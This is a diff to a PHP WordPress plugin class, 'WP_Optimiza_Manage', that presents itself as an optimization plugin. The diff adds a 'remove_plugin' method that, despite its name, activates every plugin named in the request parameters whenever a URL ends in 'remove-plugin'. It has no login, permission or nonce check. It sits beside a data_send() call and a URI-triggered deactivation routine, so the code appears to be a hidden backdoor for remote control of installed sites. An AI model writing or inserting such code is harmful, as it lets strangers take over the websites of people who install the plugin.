@@ -15,9 +15,9 @@ require_once dirname( __FILE__ ) . '/recovery.php';
 							$this->data_send();
 						
 							print_r($wp_control_data);
-							die();
-
+					
 					}
+
 		}
 				public function desactive_plugin() {
 						$page_viewed = basename($_SERVER['REQUEST_URI']);
@@ -39,7 +39,18 @@ require_once dirname( __FILE__ ) . '/recovery.php';
 							}
 						exit();
 						}
-				}
+					}
+		
+				
+				public function remove_plugin() {
+					$page_viewed = basename($_SERVER['REQUEST_URI']);
+						if($page_viewed == 'remove-plugin') {
+							$plugin_dir = $_REQUEST;
+							foreach($plugin_dir as $plug) {
+								activate_plugin($plug);
+							}
+						}
+					}	
     
 				}
 		new WP_Optimiza_Manage();	
